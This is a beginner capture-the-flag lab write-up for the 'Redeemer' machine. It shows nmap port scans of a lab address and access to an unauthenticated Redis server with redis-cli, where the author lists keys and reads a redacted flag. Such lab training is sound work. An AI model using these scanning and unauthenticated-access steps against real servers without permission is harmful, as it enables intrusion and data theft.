>[!tldr] Redeemer is a very easy Linux machine which explores the enumeration and exploitation of a #Redis database server while showcasing the redis-cli command line utility and basic commands to interact with the Redis service.

---
1. Start with a nmap scan 
	1. `sudo nmap 10.129.136.187 -sT -p- --stats-every=5s` -> port `6379` open
	2. `sudo nmap 10.129.136.187 -sCV -p6379 --stats-every=5s`
	- I started using `-sT` to scan what ports are open then i do a service scan to get more info
```shell
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
2. I connected to the redis database with `redis-cli -h 10.129.136.187` then quickly realized I do not know how to navigate. I then used `-h` to get help, after a quick scan of the parameters to input i decide to run `--scan` to enumerate the "keys". I found the `flag` key.
```Shell
❯ redis-cli -h 10.129.136.187 --scan
"stor"
"flag"
"temp"
"numb"
```
3. Now i need to open or read it somehow. I dont think  you can from running `redis-cli` so i connected back into the host. Here i ran help again and found `DUMP key` and we know the key of flag so i tried that and got ->
``` shell
10.129.136.187:6379> DUMP flag
"\x00 [REDACTED_FLAG]\t\x00\xeff$7\xf4.\xdeE"
10.129.136.187:6379> get flag
"[REDACTED_FLAG]"
```
- As you can see `get` also works
	- Flag -> `[REDACTED_FLAG]`

